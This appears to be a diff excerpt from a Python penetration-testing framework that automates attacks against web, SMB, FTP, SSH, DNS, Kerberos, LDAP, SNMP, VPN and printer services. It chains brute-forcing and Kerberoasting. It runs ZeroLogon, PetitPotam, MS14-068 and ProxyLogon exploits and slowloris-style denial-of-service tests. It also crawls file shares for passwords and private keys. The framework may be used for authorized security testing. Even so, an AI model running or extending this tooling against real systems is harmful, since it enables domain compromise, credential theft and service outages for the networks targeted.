+    run_cmd(F"curl -m 5 -f -L -k {header} {xp} {target}/security.txt", "http_robots.md", target, bl=["returned error","301","302","Empty reply from server","Connection reset by peer", "</title>"], tout=4)
+    run_cmd(F"curl -m 5 -f -L -k {header} {xp} {target}/sitemap.xml", "http_robots.md", target, bl=["returned error","301","302","Empty reply from server","Connection reset by peer", "</title>"], tout=4)
+    run_cmd(F"{pc}shcheck.py -d '{target}' | grep 'Frame\|Content-Type\|Content-Security\|Strict-Transport' | grep Missing", "http_secheader.md", target, tout=20,
+            post="btxt sechead http_secheader.md")
+    Breach.post.append("")
+    Breach.post.append("")
+    run_cmd(F"curl -m 5 {header} {xp} -sI -X HEAD '{target}'", "http_basicauth.md", target, wl=["WWW-Authenticate"])
+    run_cmd(F"curl -m 5 {header} {xp} -sI -X HEAD '{target}'", "http_403.md", target, wl=["403","401"],
+            post='''cat http_403.md | grep "X HEAD" | awk '{print $NF}' | sed "s/'//g" >> http_403.url && sort -u http_403.url > /tmp/xyz && mv /tmp/xyz http_403.url''')
+    get_http_info(target)
+   
+    if is_ssl:
+      if not Breach.proxy:
+        run_cmd(F"sslscan --no-ciphersuites --no-heartbleed '{target}' | grep -e 'TLSv1.[01].*enabled'", "http_weaktls.md", target, bl="Invalid target specified", tout=20) 
+      target_without_port = target.split(":")[1].replace("//", "")
+      run_cmd(F"echo | {pc}openssl s_client -connect '{target_without_port}:{port}' 2>/dev/null | openssl x509 -text -noout | grep -oP '(?<=DNS:)[\w\.-]+\.\w+'", "http_cert.md", target, bl=["Unable to load certificate"], tout=20,
+              post='cat http_cert.md | grep -v "#\|^$" >> domain_sub.domain && sort -u domain_sub.domain -o domain_sub.domain')
+
+  # ! -crawl
+  if Breach.crawl:
+    run_cmd(F"feroxbuster {pp} {header} -k -r -E -g -q --filter-status 404 --no-state --depth 1 -u {target}", "http_bust.md", target, bl=["Could not connect to any"], line_bl=["Scanning","Auto-filtering"], tout=60,
+            post="cat http_bust.md | grep 403 | awk '{print $6}' >> http_403.url && sort -u -o http_403.url http_403.url")
+    if not is_ip:
+      run_cmd(F"ffuf {xp} {header} -r -s -w $wl/subdomain.txt -u '{target}' -H 'Host: FUZZ.{rdom}' -ac", "http_bust.md", target, tout=30)
+    cewl_header = header.replace("rv:91", "rv91")
+    run_cmd(F"{pc}cewl {cewl_header} -m 4 '{target}'", "http_cewl.md", target, line_bl=["Scanning","Auto-filtering"], tout=60)
+    run_cmd(F"wafw00f {pp} -a '{target}'", "http_waf.md", target, bl=["No WAF detected by the generic detection"], line_bl=["Scanning","Auto-filtering"], tout=60)
+
+  # ! -scan
+  if Breach.scan:
+    run_cmd(F"{pc}sqlmap -u '{target}' {header} -afb --crawl=10 --batch --forms --risk=3 --crawl-exclude='logout|password|forgot|login' ", "http_scan.md", target, tout=900, bl=["all tested parameters do not appear to be injectable"])
+    run_cmd(F"{pc}commix -u '{target}' {header} --batch --crawl 2 --answers='sitemap=Y'", "http_scan.md", target, bl=["All tested parameters appear to be not injectable"], tout=600)
+      # commix wont find forms, just GET Params!
+    xsstrike_header = header.replace(" ", "", -1).replace("-H", " --headers ", -1)
+    run_cmd(F"{pc}xsstrike -u '{target}' {xsstrike_header} --crawl", "http_scan.md", target, tout=300)
+    run_cmd(F"{pc}bolt -u {target} -l 4 -t 4 {xsstrike_header}", "http_scan.md", target, tout=300)
+    xsrfprobe_target = target.replace(":443","").replace(":8000","").replace(":8080","").replace(":80","")
+    run_cmd(F"{pc}xsrfprobe -o /tmp/ --no-verify -q -u '{xsrfprobe_target}' --crawl --malicious", "http_scan.md", target, tout=300)
+    run_cmd(F"{pc}nuclei -silent -fr -as -u '{target}' {header}", "http_scan.md", target, tout=300)
+    run_cmd(F"{pc}nikto -host '{target}'", "http_scan.md", target, line_bl=["No CGI Directories found", "anti-clickjacking", "End Time:", "X-Content-Type-Options header", "host(s) tested"], tout=300)
+  
+  # ! -slow
+  if Breach.slow:
+    Breach.concurr_cmds = 1
+    run_cmd(F"{pc}slowhttptest -c 10000 -H -i 10 -r 200 -t GET -u '{target}' -x 24 -p 3 -l 30", "http_slowloris.md", target)
+    run_cmd(F"{pc}slowhttptest -c 10000 -B -i 10 -r 200 -t GET -u '{target}' -x 24 -p 3 -l 30", "http_slowloris.md", target)
+    run_cmd(F"{pc}slowhttptest -c 10000 -R -i 10 -r 200 -t GET -u '{target}' -x 24 -p 3 -l 30", "http_slowloris.md", target)
+    run_cmd(F"{pc}slowhttptest -c 10000 -X -i 10 -r 200 -t GET -u '{target}' -x 24 -p 3 -l 30", "http_slowloris.md", target)
+    
+  # ! -bo3
+  if Breach.bo3:
+    run_cmd(F"bo3 {target}", "http_403.md", target, line_bl=["Base Response", "Root Response", "CODE  | METHOD"], sort=1)
+
+def breach_smb(target):
+  def poison_shares():
+    pass # TODO
+  
+  Breach.sort = ["smb_*.md"]
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    port = str(445)
+  
+  user = Breach.user
+  password = Breach.password
+  dahash = Breach.hash
+    
+  # ! PW AUTHED
+  if user and password:
+    if not Breach.rootdomain:
+      print("Authenticated SMB Scan requires -rd to be set (e.g. audatis.de)")
+      sys.exit(1)
+      
+    # INFO GATHERING
+    run_cmd(F"enum4linux -A '{target}' -u '{user}' -p '{password}'", "smb_AUTH_enum4.md", target, line_bl=["====", "|   "])
+  
+    # SHARE ENUMERATION
+    run_cmd(F"cme smb '{target}' --port {port} -u '{user}' -p '{password}' --shares", "smb_AUTH_cme_READ.md", target, line_wl=["READ"], line_bl=["C$", "ADMIN$", "IPC$"],post=r"""
+            grep -q 'WRITE' smb_AUTH_cme_READ.md && cat smb_AUTH_cme_READ.md | grep '# \|WRITE' >> smb_AUTH_cme_WRITE.md
+            """)
+    run_cmd(F"smbmap -H '{target}' -d {Breach.rootdomain} -u '{user}' -p '{password}'", "smb_AUTH_map_READ.md", target, line_wl=["READ"], line_bl=["C$", "ADMIN$", "IPC$"],post=r"""
+            grep -q 'WRITE' smb_AUTH_map_READ.md && cat smb_AUTH_map_READ.md | grep '# \|WRITE' >> smb_AUTH_map_WRITE.md
+            """)
+    run_cmd(F"manspider '{target}' -u '{user}' -p '{password}' -f passw user kennw mitarbeiter geheim test vertraulich netzwerk zugang admin account network login logon cred sql", "smb_AUTH_manspider.md", target, line_wl=["\\","B)","matched"])
+    run_cmd(F"manspider '{target}' -u '{user}' -p '{password}' -c passw kennw geheim vertraulich", "smb_AUTH_manspider.md", target, line_wl=["\\","B)","matched"])
+    run_cmd(F"manspider '{target}' -u '{user}' -p '{password}' -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config", "smb_AUTH_manspider.md", target, line_wl=["\\","B)","matched"])
+    run_cmd(F"manspider '{target}' -u '{user}' -p '{password}' -e pfx p12 pkcs12 pem key crt cer csr jks keystore key keys der", "smb_AUTH_manspider.md", target, line_wl=["\\","B)","matched"])
+    
+    # NIGHTMARE
+    run_cmd(F"cme smb '{target}' -u '{user}' -p '{password}' -M spooler", 'smb_printnight.md', target, line_wl=["Spooler service enabled"])
+    run_cmd(F"printnightmare -check '{user}:{password}@{target}'", 'smb_printnight.md', target, bl=["Target does not appear to be vulnerable"])
+
+  # ! HASH AUTHED
+  if user and dahash:
+    if not Breach.rootdomain:
+      print("Authenticated SMB Scan requires -rd to be set (e.g. audatis.de)")
+      sys.exit(1)
+      
+    # INFO GATHERING
+    run_cmd(F"enum4linux -A '{target}' -u '{user}' -hashes '{dahash}'", "smb_AUTH_enum4.md", target, line_bl=["====", "|   "])
+  
+    # SHARE ENUMERATION
+    run_cmd(F"cme smb '{target}' --port {port} -u '{user}' --hashes '{dahash}' --shares", "smb_AUTH_cme_READ.md", target, line_wl=["READ"], line_bl=["C$", "ADMIN$", "IPC$"],post=r"""
+          cat smb_AUTH_cme_READ.md | grep '# \|WRITE' >> smb_AUTH_cme_WRITE.md
+          """)
+    run_cmd(F"smbmap -H '{target}' -d {Breach.rootdomain} -u '{user}' --hashes '{dahash}'", "smb_AUTH_map_READ.md", target, line_wl=["READ"], line_bl=["C$", "ADMIN$", "IPC$"],post=r"""
+          cat smb_AUTH_map_READ.md | grep '# \|WRITE' >> smb_AUTH_map_WRITE.md
+          """)
+    
+    if not Breach.switch:
+      tqdm.write(F"{Breach.red}manspider/printnightmare does not support NTLM hashes, use other tools (e.g. snaffler){Breach.endc}")
+      Breach.switch = True
+      
+  # ! ANONYM
+  else:
+    # INFO GATHERING
+    run_cmd(F"enum4linux -A {target}", "smb_ANON_enum4.md", target, line_bl=["====", "|   "])
+
+    # SHARE ENUMERATION
+    run_cmd(F"cme smb '{target}' --port {port} --shares", "smb_ANON_cme_READ.md", target, line_wl=["READ"], line_bl=["C$", "ADMIN$", "IPC$"],
+          post="grep -q 'WRITE' smb_ANON_cme_READ.md && cat smb_ANON_cme_READ.md | grep '# \|WRITE' >> smb_ANON_cme_WRITE.md")
+    if Breach.rootdomain:
+      rdom = F"-d {Breach.rootdomain}"
+    else:
+      rdom = ""
+    run_cmd(F'smbmap -H "{target}" {rdom} -u "Guest" -p ""', "smb_ANON_map_READ.md", target, line_wl=["READ"], line_bl=["C$", "ADMIN$", "IPC$"],
+      post="grep -q 'WRITE' smb_ANON_map_READ.md && cat smb_ANON_map_READ.md | grep '# \|WRITE' >> smb_ANON_map_WRITE.md")
+    run_cmd(F"smbmap -H '{target}' {rdom}", "smb_ANON_map_READ.md", target, line_wl=["READ"], line_bl=["C$", "ADMIN$", "IPC$"],
+      post="grep -q 'WRITE' smb_ANON_map_READ.md && cat smb_ANON_map_READ.md | grep '# \|WRITE' >> smb_ANON_map_WRITE.md")
+    run_cmd(F"manspider '{target}' -f passw user kennw mitarbeiter geheim vertraulich netzwerk zugang admin account network login logon cred sql", "smb_ANON_manspider.md", target, line_wl=["\\","B)","matched"])
+    run_cmd(F"manspider '{target}' -c passw kennw geheim vertraulich", "smb_ANON_manspider.md", target, line_wl=["\\","B)","matched"])
+    run_cmd(F"manspider '{target}' -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config", "smb_ANON_manspider.md", target, line_wl=["\\","B)","matched"])
+    run_cmd(F"manspider '{target}' -e pfx p12 pkcs12 pem key crt cer csr jks keystore key keys der", "smb_ANON_manspider.md", target, line_wl=["\\","B)","matched"])
+  
+  # ! ALWAYS
+  run_cmd(F'nmap -Pn -p445,139 --script "smb-vuln-*" {target}', 'smb_CLASSIC.md', target, line_wl=["ms10"], line_bl=["ERROR", "false", "ACCESS_DENIED", "Could not negotiate", "No accounts left"])
+  
+def breach_ftp(target):
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    port = str(21)
+  
+  run_cmd(F"curl ftp://{target}:{port}", "ftp_check.md", target, bl=["Access denied"] , tout=20)
+  run_cmd(F"curl ftp://anonymous:anonymous@{target}:{port}", "ftp_check.md", target, bl=["Access denied"] , tout=20)
+  run_cmd(F'nmap -Pn -sV -p{port} {target} --script "ftp* and not ftp-brute"', "ftp_check.md", target, tout=900)
+  
+  if Breach.password: # authed breach
+    run_cmd(F"curl ftp://{Breach.user}:{Breach.password}@{target}","ftp_check.md", target, bl=["Access denied"])
+  
+  if Breach.brute:
+    run_cmd(F"hydra '{target}' -I -s {port} ftp -C $wl/pw_default_comb_S.txt -t 4", "ftp_check.md", target, line_wl=["password"], tout=30)
+
+def breach_ssh(target):
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    port = str(22)
+
+  if Breach.brute:  
+    run_cmd(F"hydra '{target}' -I -s {port} ssh -C $wl/pw_default_comb.txt -t 4", "ssh_hydra.md", target, line_wl=["password"])
+    
+  run_cmd(F"ssh-audit -l fail -p {port} {target}", "ssh-audit.md", target,
+    post="grep -i cve ssh_audit.md && grep -i '# \|cve' ssh_audit.md >> ssh_cve.md")
+
+def breach_smtp(target):
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    port = str(25)
+  
+  run_cmd(F"smtp-audit {target}:{port}", "smtp_check.md", target)
+  run_cmd(F"msfconsole -qx 'use scanner/http/exchange_proxylogon;set RHOSTS {target};run;exit'", "smtp_check.md", target)  
+
+def breach_ns(target):
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    port = str(53)
+
+  if not Breach.switch:
+    Breach.switch = True
+    if not Breach.rootdomain:
+      tqdm.write(F"{Breach.red}Nameserver enumeration without rootdomain is severely limited! set with -rd.{Breach.endc}")
+      input("Press Enter to continue without rootdomain...")
+  is_ip = bool(re.match(r"^(\d{1,3}\.){3}\d{1,3}$", target))
+
+  if Breach.rootdomain:
+    run_cmd(F"dig axfr {Breach.rootdomain} @{target}", "ns_check.md", target, tout=60)
+  run_cmd(F"dig version.bind CHAOS TXT @{target}", "ns_check.md", target, wl=["SIZE"], tout=60)
+  run_cmd(F"dig axfr @{target}", "ns_check.md", target, wl=["SIZE"], tout=60)
+  run_cmd(F'nmap -Pn -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" {target} -p {port}', "ns_check.md", target)
+  run_cmd(F'dnsrecon -r 127.0.0.1/24 -n {target}', "ns_check.md", target, bl=["0 Records Found"], tout=60)
+  run_cmd(F'dnsrecon -r 10.0.0.1/24 -n {target}', "ns_check.md", target, bl=["0 Records Found"], tout=60)
+  run_cmd(F'dnsrecon -r 192.0.0.1/24 -n {target}', "ns_check.md", target, bl=["0 Records Found"], tout=60)
+  if is_ip:
+    run_cmd(F'dnsrecon -r {target}/24 -n {target}', "ns_check.md", target, bl=["0 Records Found"], tout=60)
+  else:
+    run_cmd(F'dnsenum --dnsserver {target} -f $wl/subdomain.txt {target}', "ns_check.md", target, tout=300)
+
+def breach_krb(target):
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    port = str(88)
+  
+  if Breach.dcname:
+    dcna = Breach.dcname
+  else:
+    dcna = run_quick_cmd(F"dig +short -x {target}").strip()
+    if (not dcna) or ("timed out" in dcna):
+      tqdm.write("Could not get hostname of " + target + ". skipping.. (is /etc/resolv.conf setup?)")
+      return
+    else:
+      dcna = dcna.split(".")[0]
+  
+  rdom = Breach.rootdomain
+  user = Breach.user if Breach.user else "Administrator"
+  password = Breach.password if Breach.password else None
+  hashes   = Breach.hashes if Breach.hashes else None
+
+  # ! ASREPRoast
+  if password:
+    run_cmd(F"impacket-GetNPUsers '{rdom}/{user}:{password}' -dc-ip '{target}'", "krb_roast.md", target)
+  elif hashes:
+    run_cmd(F"impacket-GetNPUsers '{rdom}/{user}' -dc-ip '{target}' -hashes '{hashes}'", "krb_roast.md", target)
+  else:
+    run_cmd(F"impacket-GetNPUsers '{rdom}/{user}' -no-pass -dc-ip '{target}'", "krb_roast.md", target)
+
+  # ! Kerberoast
+  if password:
+    run_cmd(F"impacket-GetUserSPNs -request '{rdom}/{user}:{password}' -dc-ip '{target}'", "krb_roast.md", target)
+  elif hashes:
+    run_cmd(F"impacket-GetUserSPNs -request '{rdom}/{user}' -dc-ip '{target}' -hashes '{hashes}'", "krb_roast.md", target)
+ 
+  # ! Exploits
+  # ZeroLogon
+  run_cmd(F"zerologon -t '{target}' -n '{dcna}'", "krb_exploit.md", target, tout=900)
+  if password:
+    run_cmd(F"cme smb '{target}' -u '{user}' -p '{password}' -M zerologon", "krb_exploit.md", target)
+  else:
+    run_cmd(F"cme smb '{target}' -M zerologon", "krb_exploit.md", target)
+  # Proxylogon
+  run_cmd(F"msfconsole -qx 'use scanner/http/exchange_proxylogon;set RHOSTS {target};run;exit'", "krb_exploit.md", target)
+  # PetitPotam
+  if password:
+    run_cmd(F"cme ldap '{target}' -d '{rdom}' -u '{user}' -p '{password}' -M adcs", "krb_exploit.md", target)
+    run_cmd(F"cme smb '{target}' -d '{rdom}' -u '{user}' -p '{password}' -M petitpotam", "krb_exploit.md", target)
+  # MS14-068
+  if password:
+    run_cmd(F"impacket-goldenPac  '{rdom}'/'{user}':'{password}'@'{dcna}' -dc-ip {target} -target-ip {target} -w {dcna}_golden", "krb_pac.md", target)
+  
+def breach_ldap(target):
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    port = str(389)
+  
+  if Breach.dcname:
+    dcna = Breach.dcname
+  else:
+    dcna = run_quick_cmd(F"dig +short -x {target}").strip()
+    if not dcna:
+      tqdm.write("Could not get hostname of " + target + ". skipping.. (is /etc/resolv.conf setup?)")
+      return
+    else:
+      dcna = dcna.split(".")[0]
+  
+  rdom = Breach.rootdomain
+  user = Breach.user if Breach.user else "Administrator"
+  password = Breach.password if Breach.password else None
+  hashes   = Breach.hashes if Breach.hashes else None 
+  
+  if password:
+    run_cmd(F"ldapsearch-ad -l '{target}' -u '{user}' -p '{password}' -d '{rdom}' -t info", "ldap_AUTH_check.md", target)
+    run_cmd(F"ldapsearch -x -H 'ldap://{target}:{port}' -D '{user}' -w '{password}' -s base namingcontexts", "ldap_AUTH_check.md", target, bl=["Invalid credentials"])
+    run_cmd(F"ade '{rdom}' -u '{user}@{rdom}' --all -o './ldap/ade_{dcna}'", "ldap_AUTH_check.md", target, stdinput=[password], post="""
+    cd ./ldap
+    cat ade*-computers | grep name: | sort -u | cut -d" " -f6 > ade-computers_short.txt
+    cat ade*-groups | grep givenName: | sort -u | cut -d" " -f6 > ade-groups_short.txt
+    cat ade*-ous | grep name: | sort -u | cut -d" " -f6 > ade-ous_short.txt
+    cat ade*-people | grep sAMAccountName: | sort -u | cut -d" " -f6 > ade-people_short.txt
+    cat ade*-spn | grep sAMAccountName: | sort -u | cut -d" " -f6 > ade_spn_short.txt
+    """)
+    run_cmd(F"enum4linux -L -u '{user}' -p '{password}' '{target}' ", "ldap_AUTH_check.md", target)
+    run_cmd(F"bloodhound-python -c ALL -u '{user}' -p '{password}' -d '{rdom}' -dc '{dcna}.{rdom}' -ns '{target}'", "ldap_AUTH_check.md", target,
+            post="mv ./2023*.json ./ldap")
+
+  elif hashes:
+    tqdm.write(F"{Breach.red}ldap breach with hashes is currently very limited! Get a password..{Breach.endc}")
+    run_cmd(F"ldapsearch-ad -l '{target}' -u '{user}' -H '{hashes}' -d '{rdom}' -t info", "ldap_AUTH_check.md", target)
+
+  else:
+    run_cmd(F"ldapsearch-ad -l '{target}' -d {rdom} -t info", "ldap_ANON_check.md", target)
+    run_cmd(F"ldapsearch -x -H ldap://{target}:{port} -D '{user}' -w '{password}' -s base namingcontexts", "ldap_ANON_check.md", target)
+    run_cmd(F"ade {rdom} --no-creds --all -o ./ldap/ade_{dcna}", "ldap_ANON_check.md", target, post="""
+    cd ./ldap
+    cat ade*-computers | grep name: | sort -u | cut -d" " -f6 > ade-computers_short.txt
+    cat ade*-groups | grep givenName: | sort -u | cut -d" " -f6 > ade-groups_short.txt
+    cat ade*-ous | grep name: | sort -u | cut -d" " -f6 > ade-ous_short.txt
+    cat ade*-people | grep sAMAccountName: | sort -u | cut -d" " -f6 > ade-people_short.txt
+    cat ade*-spn | grep sAMAccountName: | sort -u | cut -d" " -f6 > ade_spn_short.txt
+    """)
+    run_cmd(F"echo impacket-GetADUsers -all '{rdom}/Administrator' -dc-ip '{target}' -no-pass | tail -n +2", "ldap_ANON_check.md", target)
+    run_cmd(F"enum4linux -L '{target}'", "ldap_ANON_check.md", target)
+    run_cmd(F"enum4linux -L '{target}' -u Guest -p ''", "ldap_ANON_check.md", target)
+
+def breach_nfs(target):
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    port = str(2049)
+  
+  run_cmd(F"nmap -sV -p {port} --script='rpc*' {target}", "nfs_check.md", target)
+  run_cmd(F"showmount -e {target}", "nfs_check.md", target)
+
+def breach_snmp(target):
+  def loot_snmp():
+    while not running_brute.isdone:
+      time.sleep(1)
+
+    community_info = []
+    existing_strings = {}
+    if Breach.community:
+      try:
+        community_info = [[Breach.community.split(":")[1], "PROVIDED", Breach.community.split(":")[0]]]
+      except:
+        tqdm.write(Breach.red + "ERROR: community format = <STRING>:<VERSION> (e.g. public:2c)")
+        return
+    else:
+      # with open(f"snmp/{target}.brute", "r") as fil:
+      #   content = fil.readlines()
+      #   for lin in content:
+      #     if "(RO)" in lin:
+      #       cperm = "RO"
+      #       if "v1" in lin:
+      #         cvers = "1 "
+      #       elif "v2c" in lin:
+      #         cvers = "2c"
+      #       cstring = lin.split(" ")[11]
+      #       community_info.append([cvers, cperm, cstring])
+      #     if "(RW)" in lin:
+      #       cperm = "RW"
+      #       if "v1" in lin:
+      #         cvers = "1 "
+      #       elif "v2c" in lin:
+      #         cvers = "2c"
+             
+      #       cstring = lin.split("")[11]
+      #       community_info.append([cvers, cperm, cstring])
+      #   community_info = list({tuple(x) for x in community_info}) # Remove Duplicates
+      
+      with open(f"snmp/{target}.brute", "r") as fil:
+        content = fil.readlines()
+        for lin in content:
+          match = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+(\w+)\s+\(v(\d{1,2}c?)\)\((RW|RO)\)", lin)
+          if match:
+            cvers = match.group(3)
+            cperm = match.group(4)
+            cstring = match.group(2)
+            # Check if the community string already exists with the same version, skip if it does
+            if (cvers, cstring) not in existing_strings:
+              community_info.append([cvers, cperm, cstring])
+              existing_strings[(cvers, cstring)] = 1  # Add to the dictionary
+        
+        for community in community_info:
+          tqdm.write(Breach.green + "VALID: " + Breach.endc + target + "\t", end="")
+          tqdm.write("\t".join(community))
+          with open("snmp_comms.txt", "a") as fil:
+            fil.write(target + " " + "\t".join(community) + "\n")
+    
+    for community in community_info:
+      tqdm.write(str(community))
+      run_cmd(F"snmp-check {target} -v {community[0]} -c {community[2]}", "snmp_check.md", target)
+      run_cmd(F"snmpbrute -t {target} -a --windows --linux --cisco -c {community[2]}", "snmp_brute.md", target)
+      run_cmd(F"snmpbulkwalk {target} -v{community[0]} -c {community[2]} >> snmp/{target}.bulk", "snmp/_bulk.md", target,
+              post=F"cat snmp/{target}.bulk | sort -u > /tmp/{target}.bulk && mv /tmp/{target}.bulk snmp/{target}.bulk") 
+    Breach.threadpool -= 1
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    port = str(161)
+
+  Breach.post.append("cat snmp_comms.txt | sort -u > /tmp/snmp_sort && mv /tmp/snmp_sort snmp_comms.txt")
+  Breach.sort = ["snmp*.md"]
+  if not Breach.switch:
+    Breach.switch = True
+    run_quick_cmd("mkdir -p snmp")
+    with open("/etc/snmp/snmp.conf", "r") as fil:
+      content = fil.read()
+      if "#mibs :" not in content:
+        print(Breach.red + "ERROR: comment out 'mibs :' inside /etc/snmp/snmp.conf and re-run!" + Breach.endc)
+        sys.exit(9)
+
+  # quick basic enum
+  run_cmd(F"sudo -S nmap -sU -sV -sC --open -p {port} {target}", "snmp_nmap.md", target)
+
+  # if no community given > bruteforce and wait to be finished
+  if Breach.community:
+    running_brute = SimpleNamespace(**{"isdone": "true"})
+  else:
+    running_brute = run_cmd(F"snmpbrute -t '{target}' -a -b", F"snmp/{target}.brute",target, tout=30)
+  
+  # wait for brute to finish
+  Breach.threadpool += 1
+  snmp_loot_thread = threading.Thread(target=loot_snmp)
+  snmp_loot_thread.daemon = True
+  snmp_loot_thread.start()  
+  
+def breach_vpn(target):
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    port = str(500)
+  
+  # ! iker allows only a single instance at a time > changing cc
+  Breach.concurr_cmds = 1
+  
+  run_cmd(F"sudo -S nmap -sU -p {port} {target}", "vpn_check.md",target)
+  run_cmd(F"ike-scan -M {target}", "vpn_check.md",target)
+  run_cmd(F"sudo -S -E env PATH=$PATH iker -x /tmp/ikerout --fullalgs {target}", "vpn_check.md",target, tout=1800)
+
+def breach_rdp(target):
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    port = str(3389)
+    
+  run_cmd(F'nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p {port} {target}', "rdp_check.md", target)
+
+def breach_mysql(target):
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    port = str(3306)
+    
+  run_cmd(F"nmap -sV -p {port} --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 {target}", "mysql_check.md", target)
+
+def breach_sip(target):
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    port = str(5060)
+  
+  run_cmd(F"sipscan.py {target}", "sip_check.md", target)
+  run_cmd(F"sipexten.py {target}", "sip_check.md", target)
+  run_cmd(F"sipcrack.py {target}", "sip_check.md", target)
+  run_cmd(F"sipinvite.py {target}", "sip_check.md", target)
+  run_cmd(F"sipdigestleak.py {target}", "sip_check.md", target)
+
+def breach_printer(target):
+  if ":" in target:
+    port = target.split(":")[1]
+    target = target.split(":")[0]
+  else:
+    port = str(9100)
+
+  if not Breach.switch:
+    Breach.switch = True
+    if not os.path.exists("snmp"):
+      print(F"{Breach.purple}[!] snmp directory does not exist. breach snmp should be run before breach printer [!]{Breach.endc}")
+      input("Press any key to continue...")
+  
+  pcl = pjl = ps = ""
+  pret_checks = run_quick_cmd(F"pret --safe -q {target} pcl ; pret --safe -q {target} pjl ; pret --safe -q {target} ps")
+  for lin in pret_checks.split("\n"):
+    if "PCL support" in lin and not "not found" in lin:
+      pcl = "PCL"
+      run_cmd(F'echo "id" | pret {target} pcl ; echo "ls" | pret {target} pcl', "printer_pret.md", target)
+    if "PJL support" in lin and not "not found" in lin:
+      pjl = "PJL"
+      run_cmd(F'echo "id" | pret {target} pjl ; echo "ls" | pret {target} pjl', "printer_pret.md", target)
+    if "PS support" in lin and not "not found" in lin:
+      ps = "PS"
+      run_cmd(F'echo "id" | pret {target} ps ; echo "ls" | pret {target} ps', "printer_pret.md", target)
+  
+  if any([pcl, pjl, ps]):
+    with open("printer_support.txt", "w") as fil:
+      fil.write(F"{target} {ps} {pjl} {pcl}")
+  if not any([pcl, pjl, ps]):
+    pass
+    # TODO: read html title / printername from http_tits.txt
+    # TODO: get printer name from snmp (./snmp/target)
+    # name = ["HOST-RESOURCES-MIB::hrDeviceDescr","SNMPv2-SMI::enterprises.2699.1.2.1.2.1.1.2","SNMPv2-SMI::enterprises.1248.1.1.3.1.3.8.0","SNMPv2-SMI::enterprises.1248.1.1.3.1.14.4.1.2","SNMPv2-SMI::enterprises.1248.1.2.2.1.1.1.3.1","SNMPv2-SMI::enterprises.1248.1.7.2.1.1.1.2.4"]
+    # info = ["SNMPv2-SMI::enterprises.2699.1.2.1.2.1.1.3", "SNMPv2-SMI::enterprises.1248.1.2.2.1.1.1.1.1"]
+    # serial = ["SNMPv2-SMI::enterprises.1248.1.1.3.1.21.1.1.2.2", "SNMPv2-SMI::enterprises.1248.1.1.3.1.21.1.1.2.5", "SNMPv2-SMI::mib-2.43.5.1.1.17.1", "SNMPv2-SMI::enterprises.1248.1.2.2.1.1.1.5.1", "SNMPv2-SMI::enterprises.1248.1.2.2.2.1.1.2.1.2"]
+    # prntLang = ["SNMPv2-SMI::enterprises.1248.1.2.2.49.2.1.3"]
+    # prntLangPretty = ["SNMPv2-SMI::mib-2.43.15.1.1.2", "SNMPv2-SMI::mib-2.43.15.1.1.3", "SNMPv2-SMI::mib-2.43.15.1.1.4", "SNMPv2-SMI::mib-2.43.15.1.1.5", "SNMPv2-SMI::mib-2.43.15.1.1.6", "SNMPv2-SMI::mib-2.43.15.1.1.12"]
+    # loot_snmp("sed 's/.*: //' | sed 's/.* = //' | sed 's/\"\"/-/' | sed 's/^\"//' | sed 's/\"$//'", mib.prntLangPretty, printer.prntLangPretty)
+    # loot_snmp("sed 's/.*STRING: \"//' | sed 's/\"//'", mib.name, printer.name)
+    # loot_snmp("sed 's/.*STRING: \"//' | sed 's/\"//'", mib.info, printer.info)
+    # loot_snmp("sed 's/.*STRING: \"//' | sed 's/\"//'", mib.serial, printer.serial)
+    # loot_snmp("sed 's/.*STRING: \"//' | sed 's/\"//'", mib.prntLang, printer.prntLang)
+      
+    # # ! check if name in pret / foomatic db > check for pjl / ps / pcl support
+    # TODO: https://github.com/OpenPrinting/foomatic-db
+    # for name in found_names:
+    #   with open(pclPrinters,"r") as pclList:
+    #     for line in pclList.readlines():
+    #       if name in line: printer.pcl.append(F"{name} > pret/db/pcl.dat > {line} ")
+    #   with open(pjlPrinters,"r") as pjlList:
+    #     for line in pjlList.readlines():
+    #       if name in line: printer.pjl.append(F"{name} > pret/db/pjl.dat > {line} ")
+    #   with open(psPrinters,"r") as psList:
+    #     for line in psList.readlines():
+    #       if name in line: printer.ps.append(F"{name} > pret/db/ps.dat > {line} ")
+
+def breach_email(target):
+  if Breach.osint: osint_email(target); return
+
+def breach_company(target):
+  if Breach.osint: osint_company(target); return
+
+def breach_person(target):
+  if Breach.osint: osint_person(target); return
+
+def breach_tel(target):
+  if Breach.osint: osint_tel(target); return
+
+def breach_site(target):
+  if Breach.osint: osint_site(target); return
+
+# ! ################################################################## OSINT 
+
+def init_driver():
+  chrome_options = Options()
+  if Breach.osint_proxy:
+    chrome_options.add_argument("--proxy-server="+ Breach.osint_proxy)
+  if not Breach.headful:
+    chrome_options.add_argument("--headless")    
+  chrome_options.add_argument('--ignore-certificate-errors')
+  chrome_options.add_argument('--allow-insecure-localhost')
+  chrome_options.add_argument("--disable-gpu")
+  chrome_options.add_argument("--no-sandbox")
+  chrome_options.add_argument("--disable-dev-shm-usage")
+  chrome_options.add_argument("window-size=1920x1080")
+  Breach.driver = Chrome(options=chrome_options)
+
